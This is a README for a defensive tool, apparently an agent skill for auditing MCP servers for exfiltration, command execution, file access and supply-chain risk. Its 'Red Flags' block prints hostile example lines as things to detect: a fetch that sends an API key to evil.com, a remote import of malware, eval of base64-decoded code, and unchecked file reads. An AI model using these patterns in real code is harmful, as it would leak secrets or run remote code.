# MCP Security Audit 🔒

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Skill](https://img.shields.io/badge/Skill-MCP_Security-blue.svg)]()

> **Don't blindly trust MCP servers. Audit them first. Bitwarden CLI was compromised via npm — your MCP server could be next.**

## Why This Matters

MCP (Model Context Protocol) servers give AI agents powerful capabilities - but they can also:

- 🚨 **Exfiltrate data** to external servers
- 💀 **Execute arbitrary commands** on your machine  
- 🔓 **Access files** beyond intended scope
- ⚡ **Chain vulnerabilities** for privilege escalation

**Supply chain attacks are real:** Bitwarden CLI was compromised in April 2026 via a malicious npm package. MCP servers are npm/pip packages too — they can contain the same threats. See [our Dependency Guard](https://github.com/aptratcn/skill-dependency-guard) for pre-install scanning.

## Quick Start

1. **Copy** `SKILL.md` to your agent's skills directory
2. **Run audit** before adding any new MCP server:
   ```bash
   npm audit  # For npm-based MCP
   pip-audit  # For Python MCP
   ```
3. **Check patterns** using the checklist in SKILL.md

## What It Checks

| Audit Area | What We Look For |
|------------|------------------|
| 🌐 **Network** | Unknown domains, data exfiltration, TLS validation |
| 📁 **File Access** | Path traversal, sensitive file access, scope limits |
| ⚡ **Command Exec** | Shell injection, unsanitized input, arbitrary commands |
| 📦 **Dependencies** | Known CVEs, outdated packages, supply chain risks |
| 🔑 **Permissions** | Excessive scope, missing consent, privilege escalation |

## Risk Scoring

- **≥70**: 🚫 High risk - Do not use without review
- **40-69**: ⚠️ Medium risk - Use with caution  
- **<40**: ✅ Low risk - Generally safe

## Red Flags (Immediate Rejection)

```javascript
// 🚫 Obfuscated code
eval(atob('...'))

// 🚫 Remote code loading  
import('https://evil.com/malware.js')

// 🚫 Credential harvesting
fetch('https://evil.com?token=' + process.env.API_KEY)

// 🚫 Unrestricted file access
fs.readFileSync(userInput)  // Path traversal!
```

## Safe Patterns

```javascript
// ✅ Scoped file access
const allowedDir = path.resolve(process.cwd(), 'data');
if (!filePath.startsWith(allowedDir)) throw new Error('Access denied');

// ✅ Whitelisted commands
const allowedCommands = ['git', 'npm', 'node'];
if (!allowedCommands.includes(cmd)) throw new Error('Command not allowed');

// ✅ Explicit user consent
if (!await askUserConsent('Allow access to X?')) return;
```

## Use Cases

- **Before adding** any MCP server to your agent
- **CI/CD integration** to catch vulnerable MCPs in your codebase
- **Security review** of third-party agent frameworks
- **Compliance** audits for enterprise AI deployments

## Related Skills

- [skill-dependency-guard](https://github.com/aptratcn/skill-dependency-guard) - Pre-install supply chain scanner for npm/pip packages
- [skill-git-secret-sweep](https://github.com/aptratcn/skill-git-secret-sweep) - Scan repos for leaked secrets

## License

MIT - Use freely, audit carefully.

---

**Every MCP server you add expands your attack surface. Audit before you trust.**
